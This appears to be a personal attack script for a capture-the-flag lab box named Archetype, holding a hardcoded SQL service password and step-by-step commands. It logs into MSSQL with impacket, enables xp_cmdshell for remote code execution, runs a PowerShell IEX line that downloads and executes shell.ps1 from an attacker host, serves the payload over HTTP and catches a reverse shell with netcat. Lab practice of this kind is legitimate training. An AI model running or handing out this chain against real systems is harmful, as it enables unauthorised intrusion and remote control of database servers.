# use password M3g4c0rp123

impacket-mssqlclient ARCHETYPE/sql_svc@10.10.10.27 -windows-auth
exit 0

# then run these commands to enable xp_cmdshell and get RCE.
# EXEC sp_configure 'Show Advanced Options', 1;
# reconfigure;
# sp_configure;
# EXEC sp_configure 'xp_cmdshell', 1
# reconfigure;
# xp_cmdshell "whoami" 

# then, wait to execute this
# xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.15.65/shell.ps1\");" 


# then, run these in 2 different terminals in order to:
# 1. download the file on the target. NOTE: Current directory must contain shell.ps1 file.
python3 -m http.server 80 

# 2. Control the reverse shell.
ufw allow from 10.10.10.27 proto tcp to any port 80,443 
nc -lvnp 443